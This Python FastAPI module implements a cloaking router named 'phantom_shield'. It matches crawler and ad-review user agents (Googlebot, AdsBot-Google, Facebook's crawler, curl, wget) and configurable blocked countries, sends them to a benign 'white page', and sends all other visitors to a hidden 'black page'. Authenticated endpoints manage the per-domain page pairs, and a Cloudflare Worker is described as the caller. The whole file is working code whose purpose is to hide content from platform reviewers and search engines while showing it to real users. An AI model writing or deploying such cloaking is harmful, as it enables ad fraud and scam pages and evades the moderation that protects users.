from fastapi import APIRouter, Request, HTTPException
from pydantic import BaseModel, HttpUrl
from typing import List, Dict, Optional
import databutton as db
import re
from app.auth import AuthorizedUser # For protecting the config endpoint

router = APIRouter()

# --- Configuration Constants ---
STORAGE_CONFIG_KEY = "phantom_shield_domain_configs"
DEFAULT_GLOBAL_WHITE_URL = "https://www.google.com/search?q=safe+fallback" # Fallback if domain or its config is missing

# --- Pydantic Models ---
class CloakingDecisionResponse(BaseModel):
    target_url: HttpUrl # Ensure it's a valid URL
    decision_reason: str

class DomainConfigInput(BaseModel):
    domain_name: str # e.g., "astramart.shop"
    white_page_url: HttpUrl
    black_page_url: HttpUrl
    blocked_countries: Optional[List[str]] = [] # List of 2-letter country codes, e.g., ["CN", "RU"]
    # cloudflare_account_key: Optional[str] = None # For future use if needed

class UpdateAllConfigsInput(BaseModel):
    # Expects a dictionary where keys are domain names
    domains: Dict[str, DomainConfigInput]

# --- Helper Functions ---
KNOWN_BOT_PATTERNS = [
    r"bot", r"crawler", r"spider", r"archiver", r"yahoo! slurp", r"pingdom", r"facebookexternalhit",
    r"googlebot", r"bingbot", r"yandexbot", r"duckduckbot", r"baiduspider", r"sogou", r"exabot",
    r"facebot", r"ia_archiver", r"linkedinbot", r"mediapartners-google", r"mj12bot", r"semrushbot",
    r"ahrefsbot", r"applebot", r"adsbot-google", r"curl", r"wget", r"python-requests", r"scrapy",
    r"cloudflare", # Added Cloudflare as it can make requests to check health
]
COMPILED_BOT_REGEX = re.compile(r"(" + "|".join(KNOWN_BOT_PATTERNS) + r")", re.IGNORECASE)

# --- API Endpoints ---

@router.get("/decide-route", response_model=CloakingDecisionResponse)
async def decide_route(request: Request):
    # print(f"--- Raw Headers Received by decide_route ---")
    # for name, value in request.headers.items():
    #     print(f"Header: {name} = {value}")
    # print(f"------------------------------------------")

    host_header = request.headers.get("Host", "").lower()
    if not host_header:
        print("Warning: Host header is missing. Cannot determine domain. Routing to global default white page.")
        return CloakingDecisionResponse(target_url=DEFAULT_GLOBAL_WHITE_URL, decision_reason="missing_host_header")

    # 1. Get all domain configurations
    all_configs_stored = db.storage.json.get(STORAGE_CONFIG_KEY, default={"domains": {}})
    # The object stored is expected to be {"domains": {"domain1.com": {...}, "domain2.com": {...}}}
    domain_configs_map = all_configs_stored.get("domains", {})
    
    current_domain_config = domain_configs_map.get(host_header)

    if not current_domain_config:
        print(f"Warning: No configuration found for domain '{host_header}'. Routing to global default white page.")
        return CloakingDecisionResponse(target_url=DEFAULT_GLOBAL_WHITE_URL, decision_reason=f"no_config_for_domain_{host_header}")

    white_url = current_domain_config.get("white_page_url", DEFAULT_GLOBAL_WHITE_URL)
    black_url = current_domain_config.get("black_page_url") # If black is not set, it must not default to white
    domain_blocked_countries = current_domain_config.get("blocked_countries", [])

    if not black_url: # Critical: if black_url is not configured for a domain, route to white.
        print(f"Warning: Black page URL not configured for domain '{host_header}'. Routing to its white page.")
        return CloakingDecisionResponse(target_url=white_url, decision_reason=f"black_url_not_set_for_domain_{host_header}")

    # 2. Extract relevant headers for filtering
    user_agent = request.headers.get("User-Agent", "") # Keep original case for regex if needed, or use .lower() if regex is case insensitive
    client_ip = request.headers.get("CF-Connecting-IP") or request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or request.client.host
    country_code = request.headers.get("CF-IPCountry", "").upper()

    # print(f"Decision Request for '{host_header}': UA='{user_agent}', IP='{client_ip}', Country='{country_code}'")
    # print(f"Using URLs for '{host_header}': White='{white_url}', Black='{black_url}', BlockedCountries='{domain_blocked_countries}'")

    # 3. Apply filters
    # Filter 1: User-Agent based bot detection
    if COMPILED_BOT_REGEX.search(user_agent):
        print(f"Decision for '{host_header}': Bot detected by User-Agent ('{user_agent}'). Routing to White URL: {white_url}")
        return CloakingDecisionResponse(target_url=white_url, decision_reason="user_agent_bot_detected")

    # Filter 2: Geolocalização (Country Code)
    if country_code and country_code in domain_blocked_countries: # Ensure country_code is not empty
        print(f"Decision for '{host_header}': Country blocked ('{country_code}'). Routing to White URL: {white_url}")
        return CloakingDecisionResponse(target_url=white_url, decision_reason=f"country_blocked_{country_code.lower()}")

    # 4. If no filters are met, allow to black page
    print(f"Decision for '{host_header}': No filters met. Routing to Black URL: {black_url}")
    return CloakingDecisionResponse(target_url=black_url, decision_reason="allowed_to_black_page")

@router.post("/update-domain-config", summary="Update or Add a Single Domain Configuration")
async def update_single_domain_config(config_input: DomainConfigInput, user: AuthorizedUser): # Protected
    """
    Adds or updates the configuration for a single domain.
    The user must be authenticated.
    """
    print(f"User {user.sub} updating config for domain: {config_input.domain_name}")
    
    all_configs = db.storage.json.get(STORAGE_CONFIG_KEY, default={"domains": {}})
    if "domains" not in all_configs: # Ensure the root structure is present
        all_configs["domains"] = {}
        
    # Pydantic ensures URLs are valid, FastAPI handles validation errors if not.
    all_configs["domains"][config_input.domain_name.lower()] = {
        "white_page_url": str(config_input.white_page_url), # Store as string
        "black_page_url": str(config_input.black_page_url), # Store as string
        "blocked_countries": config_input.blocked_countries or [] # Ensure it's a list
        # "cloudflare_account_key": config_input.cloudflare_account_key # For future use
    }
    
    db.storage.json.put(STORAGE_CONFIG_KEY, all_configs)
    print(f"Configuration updated for domain: {config_input.domain_name.lower()}")
    return {"message": f"Configuration for domain {config_input.domain_name.lower()} updated successfully."}

@router.get("/get-domain-configs", summary="Get All Domain Configurations")
async def get_all_domain_configs(user: AuthorizedUser): # Protected
    """
    Retrieves all current domain configurations.
    The user must be authenticated.
    """
    print(f"User {user.sub} requesting all domain configs.")
    all_configs = db.storage.json.get(STORAGE_CONFIG_KEY, default={"domains": {}})
    return all_configs.get("domains", {}) # Return only the domains dictionary

@router.delete("/delete-domain-config/{domain_name}", summary="Delete a Single Domain Configuration")
async def delete_single_domain_config(domain_name: str, user: AuthorizedUser): # Protected
    """
    Deletes the configuration for a specific domain.
    The user must be authenticated.
    """
    domain_name_lower = domain_name.lower()
    print(f"User {user.sub} attempting to delete config for domain: {domain_name_lower}")
    
    all_configs = db.storage.json.get(STORAGE_CONFIG_KEY, default={"domains": {}})
    if "domains" in all_configs and domain_name_lower in all_configs["domains"]:
        del all_configs["domains"][domain_name_lower]
        db.storage.json.put(STORAGE_CONFIG_KEY, all_configs)
        print(f"Configuration deleted for domain: {domain_name_lower}")
        return {"message": f"Configuration for domain {domain_name_lower} deleted successfully."}
    else:
        print(f"Configuration for domain {domain_name_lower} not found for deletion.")
        raise HTTPException(status_code=404, detail=f"Configuration for domain {domain_name_lower} not found.")

# Note: The /decide-route endpoint needs to be unprotected (Auth disabled in Databutton sidebar for this API)
# because it will be called by the Cloudflare Worker, which won't have a user session.
# The /update-domain-config, /get-domain-configs, /delete-domain-config endpoints should be protected as they modify/expose sensitive config.

